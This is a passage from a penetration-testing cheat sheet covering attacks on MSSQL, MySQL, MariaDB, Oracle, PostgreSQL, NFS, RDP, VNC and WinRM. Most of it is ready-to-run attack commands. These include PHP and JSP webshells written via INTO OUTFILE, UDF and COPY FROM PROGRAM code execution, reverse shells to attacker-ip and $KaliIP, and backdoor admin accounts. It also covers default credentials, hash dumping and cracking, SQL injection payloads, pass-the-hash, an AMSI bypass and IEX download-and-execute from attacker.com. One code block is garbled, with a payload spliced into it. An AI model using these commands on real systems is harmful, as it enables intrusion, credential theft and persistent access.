> EXEC xp_cmdshell 'net user /domain';
> EXEC xp_cmdshell 'net group "Domain Admins" /domain';
> ```
> - Enumerate shares
> ```sql
> EXEC xp_cmdshell 'net view \\target-host';
> ```
> - Remote Execution
> ```sql
> EXEC xp_cmdshell 'psexec \\target-host -u domain\admin -p password cmd.exe';
> ```
> - WMI lateral movement
> ```sql
> EXEC xp_cmdshell 'wmic /node:target-host process call create "cmd.exe /c payload.exe"';
> ```

---

## MySQL

**Common Commands**

| Command            | Description             | Usage                                |
|--------------------|-------------------------|--------------------------------------|
| SHOW DATABASES;    | Lists all databases     | SHOW DATABASES;                     |
| USE                | Switch to database      | USE database_name;                  |
| SHOW TABLES;       | Display all tables      | SHOW TABLES;                        |
| SELECT             | Retrieve data           | SELECT * FROM table_name;           |
| INSERT INTO        | Insert record           | INSERT INTO table (col1) VALUES (val1); |
| UPDATE             | Update records          | UPDATE table SET col1=val1 WHERE condition; |
| DELETE FROM        | Delete records          | DELETE FROM table WHERE condition;  |
| CREATE USER        | Create new user         | CREATE USER 'user'@'host' IDENTIFIED BY 'pass'; |
| GRANT              | Grant privileges        | GRANT ALL ON db.* TO 'user'@'host'; |
| FLUSH PRIVILEGES;  | Reload privileges       | FLUSH PRIVILEGES;                   |
| LOAD_FILE()        | Read file               | SELECT LOAD_FILE('/etc/passwd');    |
| INTO OUTFILE       | Write to file           | SELECT * INTO OUTFILE '/tmp/file.txt'; |

**Connecting**
### Using MySQL client
> - Local connection (no password)
> ```bash
> mysql -u root
> ```
> - Local connection with password
> ```bash
> mysql -u username -p
> ```
> - Connect to specific database
> ```bash
> mysql -u username -p database_name
> ```
> - Remote connection
> ```bash
> mysql -u username -h target.com -P 3306 -p
> ```
> - Connect and execute query
> ```bash
> mysql -u username -p -e "SELECT @@version;"
> ```
> - Connect without database selection
> ```bash
> mysql -u username -h target.com -p --skip-database
> ```
### Using mysqldump
> - Dump specific database
> ```bash
> mysqldump -u username -p database_name > backup.sql
> ```
> - Dump all databases
> ```bash
> mysqldump -u username -p --all-databases > all_databases.sql
> ```
> - Dump specific table
> ```bash
> mysqldump -u username -p database_name table_name > table.sql
> ```
> - Remote dump
> ```bash
> mysqldump -u username -h target.com -p database_name > remote_backup.sql
> ```
**Enumeration**
### Version Detection
> - MySQL version
> ```sql
> SELECT @@version;
> SELECT VERSION();
> ```
> - Server information
> ```sql
> SELECT @@version_compile_os;
> SELECT @@version_compile_machine;
> ```
> - Detailed version info
> ```sql
> SHOW VARIABLES LIKE "%version%";
> ```
### Database
> - List all databases
> ```sql
> SHOW DATABASES;
> SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;
> ```
> - Current database
> ```sql
> SELECT DATABASE();
> ```
> - Database size
> ```sql
> SELECT 
>  table_schema AS 'Database',
>  ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
> FROM information_schema.TABLES 
> GROUP BY table_schema;
> ```
### Users
> - List MySQL users
> ```sql
> SELECT user, host FROM mysql.user;
> ```
> - Current user
> ```sql
> SELECT USER();
> SELECT CURRENT_USER();
> ```
> - User privileges
> ```sql
> SHOW GRANTS;
> SHOW GRANTS FOR 'username'@'host';
> ```
> - List users with FILE privilege
> ```sql
> SELECT user, host FROM mysql.user WHERE File_priv = 'Y';
> ```
> - List users with SUPER privilege
> ```sql
> SELECT user, host FROM mysql.user WHERE Super_priv = 'Y';
> ```
### Table and Columns
> - List tables in current database
> ```sql
> SHOW TABLES;
> SELECT table_name FROM information_schema.TABLES WHERE table_schema=DATABASE();
> ```
> - List columns in specific table
> ```sql
> SHOW COLUMNS FROM table_name;
> SELECT column_name, data_type FROM information_schema.COLUMNS WHERE table_name='users';
> ```
> - Find sensitive columns
> ```sql
> SELECT table_name, column_name FROM information_schema.COLUMNS 
> WHERE column_name LIKE '%password%' 
>   OR column_name LIKE '%pass%'
>   OR column_name LIKE '%pwd%'
>   OR column_name LIKE '%secret%'
>   OR column_name LIKE '%token%';
> ```
> - Count rows in tables
> ```sql
> SELECT table_name, table_rows FROM information_schema.TABLES 
> WHERE table_schema = DATABASE();
> ```
### Privileges
> - Check FILE privilege (for LOAD_FILE/INTO OUTFILE)
> ```sql
> SELECT file_priv FROM mysql.user WHERE user='current_user';
> ```
> - Check for dangerous privileges
> ```sql
> SELECT user, host, Select_priv, Insert_priv, Update_priv, Delete_priv, 
>       Create_priv, Drop_priv, File_priv, Super_priv 
> FROM mysql.user;
> ```
> - Current user permissions
> ```sql
> SELECT * FROM information_schema.USER_PRIVILEGES WHERE grantee LIKE '%username%';
> ```
### Configuration
> - Important variables
> ```sql
> SHOW VARIABLES;
> SHOW VARIABLES LIKE 'secure_file_priv';  # File operations directory
> SHOW VARIABLES LIKE 'plugin_dir';        # Plugin directory
> SHOW VARIABLES LIKE 'datadir';           # Data directory
> SHOW VARIABLES LIKE 'basedir';           # Base directory
> ```
> - Check if local_infile enabled
> ```sql
> SHOW VARIABLES LIKE 'local_infile';
> ```
> - Process list
> ```sql
> SHOW PROCESSLIST;
> ```
### File Operations
> - Read Files
> ```sql
> SELECT LOAD_FILE('/etc/passwd');
> SELECT LOAD_FILE('/var/www/html/config.php');
> SELECT LOAD_FILE('C:\\Windows\\win.ini');
> ```
> - Read file with hex encoding (bypasses binary issues)
> ```sql
> SELECT HEX(LOAD_FILE('/etc/passwd'));
> ```
> - Write Files
> ```sql
> SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
> SELECT 'backdoor content' INTO OUTFILE '/tmp/backdoor.txt';
> ```
> - Checking restrictions
> ```sql
> SHOW VARIABLES LIKE 'secure_file_priv';
> ```
### User Defined Functions (UDF) for RCE
> - Create malicious UDF library
> - First, create the UDF shared library (compiled C code)
> - Then load it into MySQL
> - Upload UDF library using INTO DUMPFILE
> ```sql
> SELECT 0x[hex_encoded_library] INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys_exec.so';
> ```
> - Using Union
> ```sql
> 
> - Create function
> ```sql
> CREATE FUNCTION sys_exec RETURNS int SONAME 'udf_sys_exec.so';
> ```' union select '<?php system($_GET["cmd"]); ?>' into outfile '/srv/http/shell.php' -- -
> ```
> - Windows Payload
> ```sql
> SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:/wamp/www/shell.php"
> ```
> - Execute commands
> ```sql
> SELECT sys_exec('whoami');
> SELECT sys_exec('id');
> SELECT sys_exec('bash -i >& /dev/tcp/attacker-ip/4444 0>&1');
> ```
> - Alternative: sys_eval to get output
> ```sql
> CREATE FUNCTION sys_eval RETURNS string SONAME 'udf_sys_exec.so';
> SELECT sys_eval('cat /etc/passwd');
> ```
- Uploading webshell
> - PHP webshell
> ```sql
> SELECT '<?php system($_GET["cmd"]); ?>' 
> INTO OUTFILE '/var/www/html/shell.php';
> ```
> - Access: http://target.com/shell.php?cmd=whoami

> - More sophisticated webshell
> ```sql
> SELECT '<?php
> if(isset($_REQUEST["cmd"])){
>    $cmd = $_REQUEST["cmd"];
>    echo "<pre>";
>    $result = shell_exec($cmd);
>    echo $result;
>    echo "</pre>";
>}
>?>' INTO OUTFILE '/var/www/html/advanced-shell.php';
> ```
> - JSP webshell (if applicable)
> ```sql
> SELECT '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' 
> INTO OUTFILE '/var/www/html/shell.jsp';
> ```
- Privilege Escalation
> ```sql
> - Create new admin user
> CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd123!';
> GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
> FLUSH PRIVILEGES;
> ```
> - Modify existing user password
> ```sql
> UPDATE mysql.user SET password=PASSWORD('newpassword') WHERE user='root';
> FLUSH PRIVILEGES;
> ```
> - Grant FILE privilege to user
> ```sql
> GRANT FILE ON *.* TO 'username'@'localhost';
> FLUSH PRIVILEGES;
> ```
#### Hash extraction and cracking
> - Extract password hashes (MySQL < 5.7)
> ```sql
> SELECT user, password FROM mysql.user;
> ```
> - Extract password hashes (MySQL >= 5.7)
> ```sql
> SELECT user, authentication_string FROM mysql.user;
> ```
> - Specific user hash
> ```sql
> SELECT authentication_string FROM mysql.user WHERE user='root';
> ```
> - Export hashes to file
> ```sql
> SELECT user, authentication_string FROM mysql.user 
> INTO OUTFILE '/tmp/hashes.txt';
> ```
> - Extract hashes
> ```bash
> mysql -u root -p -e "SELECT CONCAT(user, ':', authentication_string) FROM mysql.user" > mysql_hashes.txt
> ```
> - Crack with hashcat (MySQL 4.1/MySQL 5+)
> ```bash
> hashcat -m 300 mysql_hashes.txt rockyou.txt
> ```
> - Crack with John the Ripper
> ```bash
> john --format=mysql-sha1 mysql_hashes.txt
> ```
> - Old MySQL (pre-4.1)
> ```bash
> hashcat -m 200 old_mysql_hash.txt rockyou.txt
> ```
- Data exfiltration
> - Extract sensitive data
> ```sql
> SELECT * FROM users WHERE role='admin';
> SELECT username, password, email FROM accounts;
> SELECT * FROM credit_cards;
> SELECT * FROM personal_information;
> ```
> - Export database to file
> ```sql
> SELECT * FROM sensitive_table 
> INTO OUTFILE '/tmp/exfiltrated_data.csv'
> FIELDS TERMINATED BY ',' 
> ENCLOSED BY '"'
> LINES TERMINATED BY '\n';
> ```
> - Concatenate and export
> ```sql
> SELECT CONCAT(username, ':', password) FROM users 
> INTO OUTFILE '/tmp/credentials.txt';
> ```

---

## MariaDB

> - Basic SQL Injection
> ```sql
> admin ' OR 1=1 -- 
> ```
> - Alternative Syntax
> ```sql
> 1' OR 1 = 1 #
> ```
> - Union-Based Data Extraction (Column Guessing)
> ```sql
> ' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema=database()-- 
> ```
> - Extract Table and Column Information
> ```sql
> ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- 
> ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='<table_name>'-- 
> ```
> - Extract Data from Target Table
> ```sql
> ' UNION SELECT <column1>, <column2> FROM <table_name>--
> ```

---

## Oracle

**Common Credentials**

| Username          | Password          |
|-------------------|-------------------|
| sys               | change_on_install |
| system            | manager           |
| system            | oracle            |
| scott             | tiger             |
| dbsnmp            | dbsnmp            |
| sysman            | sysman            |
| admin             | admin             |

> - Union SQL Injection with dual Table: Oracle databases often use the dual table for testing purposes.
> ```sql
> ' UNION SELECT 1,2,3,4,5 FROM dual-- 
> ```
> Correcting Number of Columns: adjust the number of columns to avoid errors.
> ```sql
> ' UNION SELECT 1,2,3 FROM dual-- 
> ```
> - Retrieve User Information: extract usernames from Oracle’s internal tables.
> ```sql
> ' UNION SELECT username, NULL, NULL FROM all_users-- 
> ```
> - Dump Table and Column Names: extract table names and column names from the Oracle database.
> ```sql
> ' UNION SELECT table_name, NULL, NULL FROM all_tables-- 
> ' UNION SELECT column_name, NULL, NULL FROM all_tab_columns WHERE table_name='<table_name>'-- 
> ```
> Dump Data from Table: finally, retrieve specific data from a target table.
> ```sql
> ' UNION SELECT <column_name>, NULL FROM <table_name>-- 
> ```
> - Example of bypassing Oracle DB login:
> ```sql
> admin ' OR 1=1 -- 
> ```
> - System privileges for current user
> ```sql
> SELECT * FROM session_privs;
> ```
> - All system privileges
> ```sql
> SELECT * FROM dba_sys_privs WHERE grantee='USERNAME';
> ```
> - Role privileges
> ```sql
> SELECT * FROM dba_role_privs WHERE grantee='USERNAME';
> ```
> - Table privileges
> ```sql
> SELECT * FROM dba_tab_privs WHERE grantee='USERNAME';
> ```
> - Check for DBA role
> ```sql
> SELECT granted_role FROM user_role_privs WHERE granted_role='DBA';
> ```
> - Extract password hashes (Oracle 10g)
> ```sql
> SELECT name, password FROM sys.user$;
> ```
> - Extract password hashes (Oracle 11g+)
> ```sql
> SELECT name, spare4 FROM sys.user$;
> ```
> - Both versions
> ```sql
> SELECT username, password, spare4 FROM dba_users;
> ```
> - Password versions
> ```sql
> SELECT username, password_versions FROM dba_users;
> ```

---

## NFS

| Version | Features                      | Security           |
|---------|-------------------------------|--------------------|
| NFSv2   | Basic functionality           | Weak security      |
| NFSv3   | Better performance             | AUTH_SYS only      |
| NFSv4   | ACLs, better security         | Kerberos support   |

**using Mount**
> - List NFS shares
> ```bash
> showmount -e target.com
> ```
> - Mount NFS share
> ```bash
> mkdir /mnt/nfs
> mount -t nfs target.com:/share /mnt/nfs
> ```
> - Mount with specific NFS version
> ```bash
> mount -t nfs -o vers=3 target.com:/share /mnt/nfs
> mount -t nfs -o vers=4 target.com:/share /mnt/nfs
> ```
> - Mount without root squashing
> ```bash
> mount -t nfs -o nolock target.com:/share /mnt/nfs
> ```
> - Read-only mount
> ```bash
> mount -t nfs -o ro target.com:/share /mnt/nfs
> ```
> - Unmount
> ```bash
> umount /mnt/nfs
> ```
**Share Enumeration**
#### Using showmount
> - List exported shares
> ```bash
> showmount -e target.com
> ```
> - List directories
> ```bash
> showmount -d target.com
> ```
> - List clients
> ```bash
> showmount -a target.com
> ```
- Using rpcinfo
> - Using rpcinfo
> ```bash
> rpcinfo -p target.com
> ```
> - Manual RPC query
> ```bash
> rpcinfo target.com | grep nfs
> ```
#### Exploration
> - Mount share
> ```bash
> mount -t nfs target.com:/share /mnt/nfs
> ```
> - List contents
> ```bash
> ls -la /mnt/nfs
> ```
> - Find interesting files
> ```bash
> find /mnt/nfs -type f -name "*.conf"
> find /mnt/nfs -type f -name "*.key"
> find /mnt/nfs -type f -name "*.pem"
> find /mnt/nfs -type f -name "*password*"
> find /mnt/nfs -type f -name "*.env"
> ```
> - Search for credentials
> ```bash
> grep -r "password\|secret\|key" /mnt/nfs
> ```
> - Check permissions
> ```bash
> ls -la /mnt/nfs
> ```

---

## RDP

> - Password Spray
> ```bash
> crowbar -b rdp -s <target_ip>/32 -U users.txt -C rockyou.txt
> ```
- Logging In
> - Basic Connection to xfreerdp3
> ```bash
> xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /drive:Downloads,/home/username/Downloads /u:'<username>' /p:'<password>' /v:<IP>
> ```
> - Connect using xfreerdp with various options
> ```bash
> xfreerdp /cert-ignore /bpp:8 /compression /themes /wallpaper /auto-reconnect /h:1000 /w:1600 /v:<IP> /u:<username> /p:<password>
> ```
> - Connect with a drive mapping and increased timeout
> ```bash
> xfreerdp /u:<username> /v:<IP> /cert:ignore /p:<password> /timeout:20000 /drive:<drive_name>,<local_path>
> ```
> - Connect with clipboard support and set resolution
> ```bash
> xfreerdp /compression +auto-reconnect /u:$USER/p:$PASSWORD /v:<ip> +clipboard /size:1920x1080 /drive:desktop,/home/$YOUR_USERNAME/Desktop
> ```
> - Connect using rdesktop with credentials
> ```bash
> rdesktop -u $USER -p $PASSWORD -g 1920x1080 <ip>
> ```
> - Connect using rdesktop without credentials
> ```bash
> rdesktop <ip>
> ```

# Enable RDP If Disabled

## Check RDP Status

```powershell
$ComputerName = hostname
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
# If result is 1 then RDP is disabled
```

## Set the NLA Information to Disabled to Allow RDP

```powershell
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
```

## Set the NLA Information to Enabled to Deny RDP

```powershell
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(1)
```

## Enable RDP for the Whole Workstation

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```

## Enable RDP for a Specific User (No Active Directory)

```powershell
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "[username]"
```

## Enable RDP for a Specific User (Active Directory)

### Option 1: Using AD User

```powershell
Add-ADGroupMember -Identity "Remote Desktop Users" -Members "[domain]\[username]"
```

### Option 2: Using `net`

```powershell
net localgroup "Remote Desktop Users" "[domain]\[username]" /add
```

## Check the Firewall Status

```powershell
# This is done because if a firewall is configured, it may cause issues for RDP

# Get status: if True, the rule is enabled and RDP should work
Get-NetFirewallRule -DisplayGroup "Remote Desktop"
```

### Enable RDP Firewall Rule If Disabled

```powershell
# Enable the rule if it's disabled, ensuring traffic via port 3389 is not blocked
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

## (Alternative) Create a New User for RDP (Requires Admin Privileges)

### 1. Create the New User

```powershell
New-ADUser -Name "[username]" -AccountPassword (ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force) -Enabled $true
```

### 2. Confirm That the User Was Created Successfully

```powershell
Get-NetUser | select cn
```

### 3. Add User to RDP Group

```powershell
# Must be run as admin
Add-ADGroupMember -Identity "Remote Management Users" -Members [username]
```

### 4. Add User to Administrators Group

```powershell
# Must be run as admin
Add-ADGroupMember -Identity "Administrators" -Members [username]
```

### 5. Enable RDP Usage

```powershell
# Enable RDP
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

### 6. Connect to RDP

```bash
rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
```

---

## PostgreSQL

**Common Commands**

| Command                  | Description          | Usage                          |
|--------------------------|----------------------|--------------------------------|
| \l                       | List databases       | \l                             |
| \c                       | Connect to database  | \c database_name              |
| \dt                       | List tables          | \dt                            |
| \d table                  | Describe table       | \d users                       |
| \du                       | List users           | \du                            |
| \dn                       | List schemas         | \dn                            |
| \df                       | List functions       | \df                            |
| \dx                       | List extensions      | \dx                            |
| \q                        | Quit psql            | \q                             |
| SELECT version();         | Get version          | SELECT version();             |
| SELECT current_user;      | Current user         | SELECT current_user;          |
| SELECT current_database();| Current database     | SELECT current_database();    |

**Connecting**
> - Local connection
> ```bash
> psql -U username
> ```
> - Remote connection
> ```bash
> psql -h target.com -p 5432 -U username -d database_name
> ```
> - Connect without specifying database
> ```bash
> psql -h target.com -U postgres
> ```
> - Connection with password
> ```bash
> psql -h target.com -U username -W
> ```
> - Execute command directly
> ```bash
> psql -h target.com -U username -d database_name -c "SELECT version();"
> ```
> - Execute commands from file
> ```bash
> psql -h target.com -U username -d database_name -f script.sql
> ```
# Version Detection

### PostgreSQL version
> ```sql
> SELECT version();
> ```

### Server version number
> ```sql
> SHOW server_version;
> SHOW server_version_num;
> ```

### Detailed version info
> ```sql
> SELECT current_setting('server_version');
> ```

# Database Enumeration

### List all databases
> ```sql
> \l
> SELECT datname FROM pg_database;
> ```

### Current database
> ```sql
> SELECT current_database();
> ```

### Database owner
> ```sql
> SELECT pg_catalog.pg_get_userbyid(d.datdba) AS owner, datname 
> FROM pg_catalog.pg_database d;
> ```

### Database size
> ```sql
> SELECT pg_database.datname, 
>       pg_size_pretty(pg_database_size(pg_database.datname)) AS size 
> FROM pg_database;
> ```

### Number of connections per database
> ```sql
> SELECT datname, count(*) FROM pg_stat_activity GROUP BY datname;
> ```

# User Enumeration

### List all users
> ```sql
> \du
> SELECT usename FROM pg_user;
> SELECT usename, usesysid FROM pg_shadow;
> ```

### Current user
> ```sql
> SELECT current_user;
> SELECT user;
> SELECT session_user;
> ```

### User privileges
> ```sql
> SELECT usename, usecreatedb, usesuper FROM pg_user;
> ```

### Superusers
> ```sql
> SELECT usename FROM pg_user WHERE usesuper = true;
> ```

### Users with create database privilege
> ```sql
> SELECT usename FROM pg_user WHERE usecreatedb = true;
> ```

# Schema and Table Enumeration

### List schemas
> ```sql
> \dn
> SELECT schema_name FROM information_schema.schemata;
> ```

### List tables in current database
> ```sql
> \dt
> SELECT table_name FROM information_schema.tables WHERE table_schema='public';
> ```

### List all tables across all schemas
> ```sql
> SELECT schemaname, tablename FROM pg_tables;
> ```

### List columns in specific table
> ```sql
> \d table_name
> SELECT column_name, data_type FROM information_schema.columns 
> WHERE table_name='users';
> ```

### Find sensitive columns
> ```sql
> SELECT table_schema, table_name, column_name 
> FROM information_schema.columns 
> WHERE column_name LIKE '%password%' 
>   OR column_name LIKE '%pass%'
>   OR column_name LIKE '%secret%'
>   OR column_name LIKE '%token%'
>   OR column_name LIKE '%key%';
> ```

### Count rows in tables
> ```sql
> SELECT schemaname, relname, n_live_tup 
> FROM pg_stat_user_tables 
> ORDER BY n_live_tup DESC;
> ```

# Privilege Enumeration

### Current user privileges
> ```sql
> \du+
> ```

### Table privileges for current user
> ```sql
> SELECT grantee, privilege_type 
> FROM information_schema.table_privileges 
> WHERE grantee = current_user;
> ```

### Check if superuser
> ```sql
> SELECT usesuper FROM pg_user WHERE usename = current_user;
> ```

### Check file read/write permissions
> ```sql
> # Requires pg_read_file/pg_write_file functions
> SELECT has_function_privilege('pg_read_file(text)', 'execute');
> SELECT has_function_privilege('pg_ls_dir(text)', 'execute');
> ```

# Function and Extension Enumeration

### List installed extensions
> ```sql
> \dx
> SELECT extname, extversion FROM pg_extension;
> ```

### List functions
> ```sql
> \df
> SELECT proname FROM pg_proc WHERE proname !~ '^pg_';
> ```

### List large objects
> ```sql
> \lo_list
> SELECT oid, pg_size_pretty(lo_get(oid)) FROM pg_largeobject_metadata;
> ```

### Check for dangerous functions
> ```sql
> SELECT proname FROM pg_proc 
> WHERE proname IN ('pg_read_file', 'pg_ls_dir', 'pg_read_binary_file');
> ```

# Configuration Enumeration

### Important settings
> ```sql
> SHOW all;
> SHOW data_directory;
> SHOW config_file;
> SHOW hba_file;
> SHOW log_directory;
> ```

### File locations
> ```sql
> SELECT name, setting FROM pg_settings WHERE name LIKE '%file%' OR name LIKE '%dir%';
> ```

### Logging settings
> ```sql
> SELECT name, setting FROM pg_settings WHERE name LIKE 'log%';
> ```

### Connection settings
> ```sql
> SELECT name, setting FROM pg_settings WHERE category = 'Connections and Authentication';
> ```

# SQL Injection
### Error-based injection
> ```sql
> ' AND 1=CAST((SELECT version()) AS int)--
> ````
### Union-based injection
> ```sql
> ' UNION SELECT NULL, version(), NULL--
> ' UNION SELECT NULL, current_database(), NULL--
> ```
### Boolean-based blind
> ```sql
> ' AND (SELECT COUNT(*) FROM pg_user WHERE usename='postgres')=1--
> ```
### Time-based blind
> ```sql
> ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
> '; SELECT pg_sleep(5)--
> ```
### Stacked queries (if supported)
> ```sql
> '; DROP TABLE test_table;--
> ```

### Code Execution
> ```sql  
> DROP TABLE IF EXISTS cmd_exec;  
> CREATE TABLE cmd_exec(cmd_output text);  
> COPY cmd_exec FROM PROGRAM 'id';  
> SELECT * FROM cmd_exec;  
> DROP TABLE IF EXISTS cmd_exec;
> ```
### Reverse Shell
> ```sql
> DROP TABLE IF EXISTS cmd_exec;  
> CREATE TABLE cmd_exec(cmd_output text);
> COPY cmd_exec FROM PROGRAM 'sh -i >& /dev/tcp/$KaliIP/8080 0>&1';
> SELECT * FROM cmd_exec;  
> DROP TABLE IF EXISTS cmd_exec;
> ```

# Other Useful commands
### Query the contents of a specific table
> ```sql
> SELECT * FROM <TABLE_NAME>;
> ```
### Get detailed information about a table, including columns and their types
> ```sql
> \d+ <TABLE_NAME>
> ```
### Execute a query to find specific data, such as users with a particular attribute
> ```sql
> SELECT * FROM users WHERE attribute = 'value';
> ```
### Example command to list all tables and their columns
> ```sql
> SELECT table_name, column_name, data_type
> FROM information_schema.columns
> WHERE table_schema = 'public';
> ```
### Execute an SQL command to create a new table
> ```sql
> CREATE TABLE test_table (
>      id SERIAL PRIMARY KEY,
>      name VARCHAR(100),
>      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
>    );
> ```
### Insert data into a table
> ```sql
> INSERT INTO test_table (name) VALUES ('example_data');
> ```
### Update data in a table
> ```sql
> UPDATE test_table SET name = 'updated_data' WHERE id = 1;
> ```
### Delete data from a table
> ```sql
> DELETE FROM test_table WHERE id = 1;
> ```

---

## VNC

### Basic Connection
```bash
vncviewer <ip>:5900
```

### More Detailed Connection with Authentication
```bash
vncviewer -passwd /path/to/passwordfile <ip>:5900
```

# Common Default Credentials

- No Password
- `vnc`
- `1234`

# Usage Once Connected

1. Explore the filesystem
2. Run commands
3. Capture screenshots with `scrot`
4. Manipulate files

---

## WinRM

#### Connecting using Powershell

### Create credentials
> ```powershell
> $password = ConvertTo-SecureString "password" -AsPlainText -Force
> $cred = New-Object System.Management.Automation.PSCredential("administrator", $password)
> ```
### Connect interactively
> ```powershell
> Enter-PSSession -ComputerName target.com -Credential $cred
> ```
### Run command remotely
> ```powershell
> Invoke-Command -ComputerName target.com -Credential $cred -ScriptBlock { whoami }
> ```
### Connect to multiple machines
> ```powershell
> $computers = "server1", "server2", "server3"
> Invoke-Command -ComputerName $computers -Credential $cred -ScriptBlock { hostname }
> ```

#### Enumeration

# User Enumeration

### List local users
> ```powershell
> Get-LocalUser
> ```

### List domain users (if domain-joined)
> ```powershell
> Get-ADUser -Filter *
> ```

### Get current user
> ```powershell
> whoami
> $env:USERNAME
> ```

### Get user groups
> ```powershell
> whoami /groups
> Get-LocalGroup
> Get-ADGroupMember "Domain Admins"
> ```

# System Information

### System information
> ```powershell
> systeminfo
> Get-ComputerInfo
> ```

### OS version
> ```powershell
> [System.Environment]::OSVersion
> Get-WmiObject Win32_OperatingSystem
> ```

### Architecture
> ```powershell
> [System.Environment]::Is64BitOperatingSystem
> $env:PROCESSOR_ARCHITECTURE
> ```

### Hostname
> ```powershell
> hostname
> $env:COMPUTERNAME
> ```

### Domain information
> ```powershell
> Get-WmiObject Win32_ComputerSystem | Select Domain
> ```

# Network Enumeration

### Network interfaces
> ```powershell
> ipconfig /all
> Get-NetIPAddress
> Get-NetIPConfiguration
> ```

### Routing table
> ```powershell
> route print
> Get-NetRoute
> ```

### ARP table
> ```powershell
> arp -a
> Get-NetNeighbor
> ```

### Active connections
> ```powershell
> netstat -ano
> Get-NetTCPConnection
> ```

### DNS cache
> ```powershell
> ipconfig /displaydns
> Get-DnsClientCache
> ```

# Process and Service Enumeration

### List running processes
> ```powershell
> Get-Process
> tasklist /v
> ```

### Enumerate Windows services
> ```powershell
> Get-Service
> sc query
> ```

### List scheduled tasks
> ```powershell
> Get-ScheduledTask
> schtasks /query /fo LIST /v
> ```

### List startup programs
> ```powershell
> Get-CimInstance Win32_StartupCommand
> wmic startup get caption,command
> ```

# Share Enumeration

### List shares
> ```powershell
> net share
> Get-SmbShare
> Get-WmiObject Win32_Share
> ```

### Access shares
> ```powershell
> net use \\target\share
> Get-SmbMapping
> ```

### Find accessible shares on network
> ```powershell
> Get-SmbShare -CimSession (Get-ADComputer -Filter *).Name
> ```

# Using evil-winrm with NTLM hash
> ```bash
> evil-winrm -i target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
> ```

# Using crackmapexec
> ```bash
> crackmapexec winrm target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
> ```

**Powershell Remoting**

| Cmdlet          | Description             | Example                                         |
|-----------------|-------------------------|-------------------------------------------------|
| Enter-PSSession | Interactive remote session | `Enter-PSSession -ComputerName target`         |
| Exit-PSSession  | Exit remote session     | `Exit-PSSession`                                |
| Invoke-Command  | Run command remotely    | `Invoke-Command -ComputerName target -ScriptBlock {cmd}` |
| New-PSSession   | Create persistent session | `$s = New-PSSession -ComputerName target`       |
| Remove-PSSession| Close session           | `Remove-PSSession -Session $s`                 |
| Get-PSSession   | List active sessions    | `Get-PSSession`     

**Evil-winrm commands**

| Command        | Description                  | Usage                                       |
|----------------|------------------------------|---------------------------------------------|
| upload         | Upload file to target         | `upload /local/file.exe C:\Windows\Temp\file.exe` |
| download       | Download file from target     | `download C:\file.txt /tmp/file.txt`       |
| services       | List services                 | `services`                                 |
| menu           | Show available commands       | `menu`                                     |
| Bypass-4MSI    | Bypass AMSI                   | `Bypass-4MSI`                              |
| Invoke-Binary  | Execute binary from memory    | `Invoke-Binary /path/to/binary.exe` 

**Pass-the-Hash**

### Using evil-winrm with NTLM hash
> ```bash
> evil-winrm -i target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
> ```
### Using crackmapexec
> ```bash
> crackmapexec winrm target.com -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
> ```

**Command Execution**

### Basic command execution
> ```powershell
> Invoke-Command -ComputerName target.com -ScriptBlock { whoami }
> ```
### Multiple commands
> ```powershell
> Invoke-Command -ComputerName target.com -ScriptBlock {
>  whoami
>  hostname
>  ipconfig
>}
> ```
### Execute local script on remote
> ```powershell
> Invoke-Command -ComputerName target.com -FilePath .\script.ps1
> ```
### Download and execute
> ```powershell
> Invoke-Command -ComputerName target.com -ScriptBlock {
>  IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
>}
> ```

**Privilege Execution**

#### Check privileges
> ```cmd
> whoami /priv
> ```
#### Check for unquoted service paths
> ```cmd
> wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
> ```
> #### Check for always install elevated
> ```cmd
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
> ```
#### Check for stored credentials
> ```cmd
> cmdkey /list
> dir C:\Users\username\AppData\Local\Microsoft\Credentials\
> dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
> ```
#### PowerUp enumeration
> ```powershell
> IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
> Invoke-AllChecks
> ```

**Lateral Movement**

### Execute on multiple machines
> ```powershell
